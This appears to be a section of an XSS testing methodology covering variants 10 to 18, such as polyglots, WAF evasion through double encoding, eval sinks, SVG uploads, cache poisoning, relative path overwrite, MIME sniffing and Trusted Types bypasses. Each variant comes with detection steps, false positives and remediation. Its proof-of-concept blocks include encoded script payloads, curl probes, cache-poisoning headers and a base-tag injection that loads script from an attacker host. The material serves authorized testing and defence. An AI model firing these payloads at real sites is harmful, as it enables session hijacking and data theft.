# Variants 10-18 — xss-testing

Continues from `variants-1.md`. Encoding/evasion primitives (double URL encoding, entity
encoding, comment splitting) are tabulated in `payloads.md` §4.

## Table of contents

- [V-10: Cross-context resiliency (universal polyglot XSS payloads)](#v-10-cross-context-resiliency-universal-polyglot-xss-payloads)
- [V-11: Non-alphanumeric execution (JJEncode / AAEncode / JSFuck)](#v-11-non-alphanumeric-execution-jjencode--aaencode--jsfuck)
- [V-12: Double encoding obfuscation (WAF evasion: URL / HTML entity / Unicode)](#v-12-double-encoding-obfuscation-waf-evasion-url--html-entity--unicode)
- [V-13: Indirect string evaluation sinks (bypassing sanitized primitive paths)](#v-13-indirect-string-evaluation-sinks-bypassing-sanitized-primitive-paths)
- [V-14: Vector insertion via file formats (SVG / PDF / Markdown / XML)](#v-14-vector-insertion-via-file-formats-svg--pdf--markdown--xml)
- [V-15: Second-order reflected XSS via client-side cache injection](#v-15-second-order-reflected-xss-via-client-side-cache-injection)
- [V-16: Relative path overwrite (RPO) context confusion](#v-16-relative-path-overwrite-rpo-context-confusion)
- [V-17: MIME-sniffing assisted XSS (Content-Type misconfigurations)](#v-17-mime-sniffing-assisted-xss-content-type-misconfigurations)
- [V-18: Breaking Trusted Types via unsanitized policy injection sinks](#v-18-breaking-trusted-types-via-unsanitized-policy-injection-sinks)

---

## V-10: Cross-context resiliency (universal polyglot payloads)

**Mechanism:** One payload is syntactically valid in several contexts at once — HTML text, quoted/unquoted attribute, JS string, comment, URL — so it fires regardless of which of several sinks the input reaches, or when the context can't be determined before firing. The violated assumption is defensive redundancy: apps encode for *one* context while the reflection lands in another; a polyglot survives the mismatch.

**Preconditions:**
- Unknown or multiple reflection contexts: multi-parameter pages, template with several slots, or a WAF that punishes per-shape probing.
- At least one context in the polyglot's coverage renders unsanitized.

**Detect:**
1. The signal *is* the ambiguity: several params reflect, context changes per template, or boundary probes (V-02 ladder) return mixed results.
2. Fire one polyglot probe (`payloads.md` §3) across all candidate params.
3. After execution, reduce: remove payload pieces until it stops firing — the piece that mattered is your real context; then exploit it precisely with the V-02 family for a cleaner report.
4. Record per-parameter contexts for steps-to-reproduce.

**Proof of concept:**
```bash
for p in q search name next; do
  curl -s "https://<TARGET>/path?${p}=<POLYGLOT-PROBE>" | grep -o '.\{0,60\}<POLYGLOT-MARKER>.\{0,60\}'
done
```

**Confirm:** execution in a real browser on the winning parameter AND the reduction test identifying the single context it actually exploited — report the precise context, not "polyglot magic".

**False positives:** polyglot reflecting in 5 params but executing in 0 (HTML-encoded everywhere — grep hits are not hits); execution only in a hand-edited URL (self-XSS); reporting the polyglot when a boring single-context payload suffices — triage distrusts them; probe fragments matching unrelated markup (check the rendered DOM, not response bytes).

**Impact:** phrase it like the precise context it turned out to be (V-02 style) plus the robustness note: "works across template variants, so filter-style partial fixes won't kill it."

**Remediation:** per-slot context-aware encoding — a polyglot succeeding proves encoding is context-blind; fix the slots, don't hunt the magic string.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-11: Non-alphanumeric execution (JJEncode / AAEncode / JSFuck)

**Mechanism:** JavaScript runs without keywords — JSFuck (`[]()!+` only), JJEncode (dot-mangled), AAEncode (full-width/dotted), or escapes inside identifiers (`al\u0063ert`). Blocklists and WAF signatures keyed on `alert`/`script`/`onerror` fail because semantics only appear after the encoding layer is decoded by `eval`/`Function`. The violated assumption: "we blocklisted dangerous words" — words were never required.

**Preconditions:**
- A string-to-code sink somewhere in the path: `eval`, `Function`, string-`setTimeout`, `$.globalEval`, or an allowed `<script>`/`srcdoc` slot (V-13).
- OR a script-inclusion slot where an encoded blob can be hosted (self-hosted `<script src>` for blind XSS).
- Body-size headroom: JSFuck explodes in size (KBs → MBs for trivial code).

**Detect:**
1. Send a naive keyword payload; if blocked, climb the ladder: `al\u0063ert(1)` → `al'+'ert(1)` → symbol-only encoding — at each rung check both WAF status and unmodified reflection.
2. Find the eval-shaped sink first (V-13) — encoded payloads with no sink are dead letters.
3. Measure size limits: WAF/body caps truncate mid-payload, and silent truncation looks like a miss.
4. Prefer `\u`-escape or concatenation forms in reports; keep full JSFuck as the "if you must" rung.

**Proof of concept:**
```http
POST /api/run            {"expr":"<ESCAPED-ENCODING-OF: alert(document.domain)>"}
GET  /app#<JS-CONTEXT-ESCAPED-FORM>     # when location.hash feeds an eval sink
```

**Confirm:** browser executes the decoded logic (marker fires) AND the differential: naive form blocked in the same session while the encoded form passes — proving the encoding was load-bearing.

**False positives:** encoding that only runs on a page *you* built to eval it (self-XSS); `\u` escapes inside an ordinary JS *string* that never reaches a code-eval path (inert); size-truncated payloads that merely corrupt the response (no execution); AAEncode pasted as plain HTML text (never decoded — no sink).

**Impact:** a filter/WAF bypass primitive: "execution achieved despite keyword filtering on the expression field" — severity follows the underlying sink, not the encoding.

**Remediation:** drop token blocklists; encode output per context and remove string-to-code sinks — the encoding layer was only the symptom.

**CWE / OWASP:** CWE-79 / CWE-94 / OWASP A03:2021 Injection.

---

## V-12: Double encoding obfuscation (WAF evasion: URL / HTML entity / Unicode)

**Mechanism:** Security layers decode a different number of times than the app. Double URL encoding (`%253C` → `%3C` → `<`), HTML entities (`&#x3C;`), nested entities (`&amp;lt;` decoded twice at two layers), overlong UTF-8, case mixing (`<ScRiPt>`), and comment splitting (`<scr<!--ipt>`) each exploit a decode-order mismatch between WAF matcher and app/browser parser. The violated assumption: "the WAF inspected this content" — it inspected different bytes than the browser eventually parses.

**Preconditions:**
- A WAF/filter matching on raw or once-decoded stream.
- The app (or a downstream layer: proxy, CDN, framework) decodes *again* before rendering, or the *browser* performs a decode the WAF assumed was last.
- Character-set ambiguity (legacy `%u003c`-style servers).

**Detect:**
1. Baseline: naive payload → expect WAF block (403 or block-page).
2. Re-encode one technique per request (`payloads.md` §4): single → double URL → entity → mixed case → comment-split → JS Unicode escape → nested combos (entity-inside-URL).
3. Classify each response: **blocked** (control working) / **passed but sanitized** (decoded and cleaned — not yet a bypass) / **passed and reflected raw** (candidate → confirm).
4. Confirm end-state in a browser: load the candidate, inspect the DOM for active markup. Reflected-as-`%3C` that the browser never decodes is inert — modern browsers do *not* double-decode URL sequences; double-decode landings are server-side and form-body paths.
5. For entities: verify decode ordering — entity surviving to the DOM as literal text is safe; entity decoded *after* the sanitizer is your bypass.

**Proof of concept:**
```bash
curl -s -o /dev/null -w '%{http_code}\n' 'https://<TARGET>/s?q=<script>alert(1)</script>'   # naive: blocked
curl -s 'https://<TARGET>/s?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E' | grep -o '<script>.*</script>'
```

**Confirm:** rendered DOM contains the active element in a real browser, with the naive equivalent WAF-blocked in the same session — differential WAF behavior + browser-side execution.

**False positives:** WAF 403 is the control *working* (never report a block as a finding); app decodes twice but sanitizes after the second decode (safe by design — check ordering); double-encoded bytes reflected literally as text (browser shows `%3C` — inert); overlong UTF-8 / UTF-7 claimed against modern browsers (both dead: strict UTF-8 everywhere, UTF-7 gone — legacy/IE targets only).

**Impact:** "WAF bypass enabling XSS" is a combined finding — the executing XSS is the core issue, the evasion is the severity multiplier; rules need updating even after input encoding is fixed.

**Remediation:** decode exactly once at the boundary, sanitize the decoded form, output-encode at render; WAF rules must match the same normalized form the app renders.

**CWE / OWASP:** CWE-79 with CWE-116 (Improper Encoding) / OWASP A03:2021 Injection.

---

## V-13: Indirect string evaluation sinks (bypassing via evaluation functions)

**Mechanism:** Some sinks treat strings as *code*: `eval`, `new Function`, string-first `setTimeout`/`setInterval`, `$.globalEval`, attacker-URL `import()`, `location = "javascript:..."`, `setAttribute('href','javascript:...')`, `iframe.srcdoc`, jQuery's `$(htmlString)` auto-parse. Upstream encoding and "safe string" handling become irrelevant once the string is evaluated. The violated assumption: "it's just a string" — at this sink it's a program.

**Preconditions:**
- Tainted input reaches an eval-family sink (directly or via a V-09 gadget).
- For `javascript:` URLs: a click (or automatic navigation for `location`/form action).
- CSP without `unsafe-eval`/`unsafe-inline` blocks several of these — check the header first and score it as a real mitigant.

**Detect:**
1. Grep shipped JS for the sink list, then backward-trace to sources (V-03's method) — sinks hide one hop deep: `parse(config)` → `Function(fn)`.
2. Beware look-alikes: `JSON.parse`/`JSON5.parse` (safe), `setTimeout(fn,...)` where `fn` is a *function* (safe — only strings execute).
3. Probe with a malformed payload (`';`): a thrown SyntaxError (console or timing delta) is a strong signal the string is being evaluated.
4. Break on the sink in DevTools; visit; confirm your bytes are the evaluated argument.

**Proof of concept:**
```http
GET /app?callback=alert(document.domain)//      # JSONP-style callback sink
GET /app?redirect=javascript:<PROOF>()          # location sink — note navigation/click requirement
```

**Confirm:** debugger hit showing the attacker string as the eval/Function/setTimeout argument, plus execution. For `javascript:` sinks, execute from a clean session with a documented click and state the interaction requirement.

**False positives:** `setTimeout(function(){...})` with a *function* argument (inert); strings reaching `JSON.parse` (throws, doesn't execute); **`script.innerHTML = payload` never executes** (classic gotcha — need `appendChild` of a created script, `srcdoc`, or eval); `javascript:` rendered as text in a `value` attribute (no handler, no execution); `$(userInput)` failing jQuery's HTML heuristic and treated as a selector (throws, not executes — verify which mode fired).

**Impact:** eval-family sinks are severity-solid: input executes as code with the page's full origin privileges, and any encoding/WAF defense downstream of the sink is bypassed by definition.

**Remediation:** remove string-eval — look callbacks up by name from an allowlist map instead of `eval`, and pass data through a strict parser before any evaluation.

**CWE / OWASP:** CWE-95 (Eval Injection) / CWE-79 / OWASP A03:2021 Injection.

---

## V-14: Vector insertion via file formats (SVG / PDF / Markdown / XML)

**Mechanism:** Script lives inside a document format the app stores, converts, or renders inline: SVG (`<script>`, `onload` on `<svg>`/`<animate>`/`<set>`, `foreignObject` HTML), Markdown rendered to unsanitized HTML, XML/XSLT stylesheets, PDF JavaScript (`/OpenAction` — viewer-interpreted). The violated assumption: "it's an image/document, not a page" — SVG and XML *are* HTML-family documents and run script when served with a script-capable Content-Type.

**Preconditions:**
- Upload/preview/export endpoint accepting one of these formats (or URL→PDF / Markdown preview fetching attacker content).
- Served script-capable: `image/svg+xml` inline, `text/html` preview, `application/xhtml+xml` — not `Content-Disposition: attachment`.
- Stored and later fetched by you (self-proof) or another user (stored impact).

**Detect:**
1. Enumerate: uploads, "preview"/"render"/"export PDF" actions, Markdown fields, avatar/image fields accepting SVG, XML import/export, `?xsl=` params.
2. Upload a marker SVG; fetch the stored URL and record `Content-Type`, `Content-Disposition`, `X-Content-Type-Options`.
3. Test the serving modes separately: inline in app page (executes), direct navigation to `image/svg+xml` (executes — usually same app origin), `<img src>` or CSS background (inert — gotcha, don't overclaim).
4. Markdown: send raw `<img src=x onerror=...>` and attribute-smuggling `![zz](x "onerror=...")`; check output allowlist vs. strip.
5. PDF: `/OpenAction` proof — but PDF JS runs in the *viewer sandbox*, not the origin; verify real capability before claiming session impact.

**Proof of concept:**
```http
POST /api/upload           Content-Type: image/svg+xml; filename="p.svg"
<svg xmlns="http://www.w3.org/2000/svg" onload="<PROOF>()"><text>zz</text></svg>
GET  /uploads/<FILE_ID>.svg    ← must render + execute in browser
```

**Confirm:** direct fetch of the stored file executes the proof (DOM/console signal) with the recorded Content-Type — plus a second signal that another account's view triggers it (stored impact).

**False positives:** SVG viewed via `<img>` or CSS background (scripts inert — #1 FP here); `attachment` downloads (no render); PDF JS "executing" in a viewer with JS disabled (check your viewer); Markdown raw in API but HTML-encoded on render (test the render); execution on a *different* origin than the app (real XSS, but name that origin — impact follows it).

**Impact:** name the exact executing origin and audience: "stored SVG served `image/svg+xml` from app origin executes JS in any visitor's session" (High) vs. "PDF viewer script confined to viewer sandbox" (Low/info).

**Remediation:** serve user documents as `attachment` or from an isolated origin with `application/octet-stream` + `nosniff`; allowlist-sanitize SVG/Markdown; sandbox previews in a null-origin iframe.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection (CWE-434 Unrestricted Upload for the file-vector variants).

---

## V-15: Second-order reflected XSS via client-side cache injection

**Mechanism:** Attacker input reaches the victim on a *later* request through a persistence layer that isn't a database: browser `localStorage`/`sessionStorage` (app stores a redirect/pref and re-renders it next visit), service-worker or shared HTTP cache (poisoned via an unkeyed input: `X-Forwarded-Host`, `X-Original-URL`, path variants), or client-side routing state. The violated assumption: "this value came from *my* storage/cache, so it's trustworthy" — origin of storage ≠ origin of authorship.

**Preconditions:**
- (a) client-side state: app writes attacker strings to storage, later reads them into a sink (V-03), or (b) shared cache: cache key omits the reflecting header/param so you can poison other users' responses.
- For (b): a caching layer (CDN/WAF/app cache) keying on URL while your payload rides an unkeyed input.

**Detect:**
1. Client-side: after visiting an attacker-shaped URL, dump `localStorage`, `sessionStorage`, IndexedDB, service-worker caches (DevTools → Application); then re-visit *without* the crafted URL and watch those values render.
2. Shared cache: identify reflected unkeyed inputs (`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Origin`, `Referer`); send poison request, then a *clean* victim request (same URL, no header, different session); payload returning = shared poison.
3. Read `Age`/`X-Cache`/`Via` and replay with a `?cb=` cache-buster to separate cache-served from dynamic responses.
4. Grade by blast radius: storage-based = same victim who clicked your link (next visit); shared cache = any visitor, zero interaction — much higher severity.

**Proof of concept:**
```http
GET /page                       X-Forwarded-Host: <ATTACKER-VALUE-REFLECTED-AS-PAYLOAD>   # poison
GET /page                       (clean session, no special headers)                        # victim fetch
```
Storage variant: request A that *stores* the string, request B (clean URL) that *renders* it.

**Confirm:** the clean request/client-side state produces the payload *without the attacker input riding along* — that's what makes it second-order. For shared cache, reproduce from a second network position or cookie-less client to rule out personalized caching of your own session.

**False positives:** same-user HTTP cache or bfcache replay (you sent it yourself); personalized pages cached for your own session (only you see it); service worker caching only your own visits (downgrade: "requires prior visit"); CDN echoing your own poisoned response back to *you* (test with a clean client before claiming cross-user).

**Impact:** severity hinges on audience: shared-cache poisoning with no interaction = High/Critical (any visitor, no click); client-storage second-order = Medium unless other roles trigger it. State the delivery precondition explicitly.

**Remediation:** include every reflected input in the cache key (or don't reflect headers), mark personalized responses `Cache-Control: no-store`, and re-encode stored client state at render.

**CWE / OWASP:** CWE-79 / CWE-524 (Cache Containing Sensitive Information) / OWASP A03:2021 Injection.

---

## V-16: Relative path overwrite (RPO) context confusion

**Mechanism:** The page uses *relative* subresource refs (`<script src="assets/app.js">`, `<link href="styles.css">`, CSS `url(...)`). The attacker controls a path variant (extra segment, trailing slash, encoded dots, `<base>` injection) so the browser resolves those refs to an attacker-influenced path — attacker-uploaded content, or a JSON/HTML response reinterpreted as JS — executing in the page's origin. RPO-gadget flavor: the app's *own* JS, now loaded from a wrong (same-code) path, reads attacker data through `location`-reading gadgets. The violated assumption: "the document URL is fixed" — path shape is attacker-influenceable and resolution is the browser's job.

**Preconditions:**
- Victim page references subresources relatively (no leading `/` — check view-source).
- Attacker can influence resolution: `/seg/`, trailing slash, `/%2e%2e/`, `..;/`, `?`/`#` — OR inject `<base href>` (needs partial HTML injection, typically an unescaped attribute) — AND a content channel at the resolved path (upload, JSON echo, any same-origin response the browser parses as script/style).
- No strict nonce/hash `script-src` CSP (hashes/nonces largely kill RPO — check first).

**Detect:**
1. List every relative ref (scripts, stylesheets, CSS `url()`, favicon) and note directory- vs. page-relative resolution.
2. Try path variants on the page URL and watch resolution in DevTools Network: `/a/b` → `/a/b/x/` → `/a/b/%2e%2e/x/` → `/a/b/..;/x/` — the relative refs should normally 404; a 200 with attacker-influenced content is the opening.
3. Look for an existing `<base>` tag or an attribute where one can be injected (`"` breakout near `<head>`).
4. Find the content channel: which same-origin endpoint returns attacker bytes at the path the relative ref would resolve to (uploads classic; JSON echo works if sniffable — V-17).
5. Check CSP: nonce/`sha256` kills classic RPO; bare `default-src` does not.

**Proof of concept:**
```text
1. GET /a/b            → page contains: <script src="assets/app.js">
2. Place attacker content at the resolved path (POST/upload at /a/b/assets/app.js or variant)
3. Send victim: GET /a/b/<PATH-VARIANT>/   (so "assets/app.js" resolves to attacker content)
4. Network shows script fetched from attacker-controlled path → executes in page origin
```
`<base>` variant: inject `<base href="https://<ATTACKER>/">` → all relative refs load cross-origin (script source host doesn't matter; it executes in the page's origin).

**Confirm:** Network shows the subresource fetched from the attacker-controlled path AND execution proof in the page origin — differential: the clean path loads the legitimate resource (or safe 404), proving path confusion is the trigger.

**False positives:** 404 on the resolved path (nothing executes — not a finding alone); same-origin script you can't influence (needs a real content channel); `<base>` injected where the parser escapes it (check the DOM, not the response string); CSS `url()` confusion only = exfil/trace issue, not XSS; CDN normalizing `..` before browser resolution (verify in Network, not curl).

**Impact:** "attacker-controlled script executes in app origin via the app's own relative-path handling" — High; also note it bypasses path-based filters and input encoding, because the payload isn't in the input — it's in the *resolution*.

**Remediation:** absolute paths (`/assets/app.js`) everywhere, avoid `<base>`, CSP `script-src` with nonces/hashes, uploads served from an isolated origin.

**CWE / OWASP:** CWE-79 / CWE-16 (Configuration) / OWASP A03:2021 Injection.

---

## V-17: MIME-sniffing assisted XSS (Content-Type misconfigurations)

**Mechanism:** The browser is allowed (or tricked) into *reinterpreting* a response's type: attacker content served as `text/plain` with no `X-Content-Type-Options: nosniff`, a wrong/missing Content-Type, content-type override params (`?format=html`, `Accept:` negotiation), double extensions (`x.jpg.html`), path parameters (`file.jpg;.html`), `.HTML` case / Windows trailing-dot tricks — and the browser parses it as an HTML document running your script. The violated assumption: "Content-Type is authoritative" — without `nosniff` it's a suggestion to sniffing paths, and you may control it directly.

**Preconditions:**
- Attacker-influenced bytes in a response (upload, echo, error page).
- Missing/incorrect `nosniff`, loose/wrong Content-Type, or a user-controllable Content-Type mechanism.
- A parsing path in the *actual* target browsers: modern Chrome/Firefox honor `text/plain`+`nosniff`; sniffable cases include legacy IE/EdgeHTML, missing types, mislabeled `text/html` — verify real behavior, not folklore.

**Detect:**
1. For each attacker-influenced response record: `Content-Type`, `X-Content-Type-Options`, `Content-Disposition`, body prefix.
2. Try type-control mechanisms: `?format=html|json|text`, `Accept: text/html` vs `application/json`, `X-Requested-With` toggles, filename tricks you control (`p.jpg.html`, `p.jpg;.html`, `.HTML`, Windows `p.html.`/`p.html%20`), `.php.jpg` chains on misconfigured hosts.
3. Open each variant **in a browser** (not curl): check `document.contentType` and whether `<zz1>` parsed as an element (DevTools Elements).
4. For `text/plain` + no `nosniff` containing full HTML: confirm actual browser behavior for that pairing before claiming — the header combination *is* the bug, browser support decides severity.

**Proof of concept:**
```http
GET /download/<FILE_ID>?format=html     Accept: text/html
```
Browser assertion in the opened response: `document.contentType` → `text/html`; `!!document.querySelector('zz1')` → `true`.

**Confirm:** browser parses the bytes as a document and executes the proof — two signals: recorded response headers (verbatim) + browser execution. Sniff-test without the vulnerable header combination is not enough.

**False positives:** response already carrying `nosniff` + correct type (sniffing off — dead); `Content-Disposition: attachment` downloads (no render); `image/svg+xml` with `nosniff` (that's V-14's wrong-type question, not sniffing); curl showing HTML bytes (bytes aren't the vuln — classification is); IE-sniffing claims against a Chrome/Firefox audience (note as legacy-only).

**Impact:** "user-uploaded content executes as HTML in the application origin because the response lacks `nosniff` and carries a permissive Content-Type" — High for stored uploads on the app origin; the fix is one header, which usually lands as quick, triage-friendly remediation.

**Remediation:** always send `X-Content-Type-Options: nosniff` on user-content responses, declare the correct Content-Type, use `Content-Disposition: attachment` (or an untrusted origin) for downloads.

**CWE / OWASP:** CWE-79 / CWE-430 (Deployment of Wrong Handler) / OWASP A05:2021 Security Misconfiguration.

---

## V-18: Breaking Trusted Types via unsanitized policy injection sinks

**Mechanism:** The page enforces Trusted Types (`script-src ...; require-trusted-types-for 'script'`) so sinks only accept `TrustedScript` objects from named policies. It breaks when (a) the attacker can *create or configure* a policy — policy name or its `createHTML`/`createScript` derived from attacker data (policy injection), (b) an existing policy is a passthrough (`createHTML: s => s`), or (c) execution uses a TT-uncovered path: event-handler attributes, `javascript:` in `href`/`formaction`, `iframe srcdoc`, CSS — looping back to V-02 attribute/URL contexts. The violated assumption: "policies are code-authored" — if policy selection/bodies are data-driven, the guard keys are attacker-held.

**Preconditions:**
- CSP actually **enforcing**: `require-trusted-types-for 'script'` present (report-only ≠ enforcement — read the directive, not just the header).
- An app-created policy whose name/config/behavior is attacker-influenceable, OR a TT-uncovered sink reachable (attribute injection, `srcdoc`, `javascript:` URL).
- `trustedTypes.createPolicy` calls visible in the bundle — grep them; there may be only a few.

**Detect:**
1. Read the CSP: enforcement vs `report-only`; the `trusted-types` directive lists allowed policy names — an allowlist, and its absence means any name can be created.
2. Grep the bundle for `trustedTypes.createPolicy` — inspect handlers: passthrough (`s => s`), naive regex strip, or name built from user data (`createPolicy(userInput, ...)` — throws under an allowlist, injection point without one).
3. Baseline: fire a naive `onerror` payload — a "Trusted Types violation" console error proves enforcement is real (and correctly blocked your probe).
4. Probe gaps: `javascript:` in injected `href`/`formaction` (click-required), `iframe srcdoc`, `eval`-family only if `'unsafe-eval'` appears in TT config, and DOM clobbering of policy lookups (`<form name="policies"><input name="sanitizer">` where app code does `window.policies[name]`).
5. Passthrough policy found → feed your payload straight through its consumer sink; no bypass needed, the policy *is* the bypass.

**Proof of concept:**
```http
GET /page?tpl=<PAYLOAD-THROUGH-PASSTHROUGH-POLICY>      # weak policy path
GET /page?next=javascript:<PROOF>()                     # TT-uncovered URL sink — then click
```

**Confirm:** payload executes with **no** TT violation in the console (proving an allowed path, not that TT is off), plus a header snapshot showing `require-trusted-types-for 'script'` was active, plus the specific weakness named (passthrough / injectable name / uncovered sink).

**False positives:** TT in **report-only** mode (nothing enforced — that's "TT not enforced", a misconfiguration, not a bypass); claiming a bypass when the payload never hit a TT-guarded sink (test `innerHTML` first — a violation throw means enforcement is real); a policy name absent from `trusted-types` being "exploitable" without showing attacker control of the creation input (trace where the name comes from); DOM-clobbering claims where the app uses local variables rather than `window` lookups (read the actual code path first).

**Impact:** "Trusted Types present but defeated via passthrough policy / injectable policy creation / uncovered URL sink" — High, and worth calling out because teams treat TT as a checkbox; state which of the three failure modes it is — remediation differs per mode.

**Remediation:** give every policy a non-passthrough body (`createHTML` = DOMPurify/allowlist), pin names in the `trusted-types` directive, keep enforcement (not report-only), and close the uncovered gap (encode `href`/`formaction`, disallow `srcdoc`) — fixing enforcement while leaving a weak policy changes nothing.

**CWE / OWASP:** CWE-79 / CWE-693 (Protection Mechanism Failure) / OWASP A03:2021 Injection.
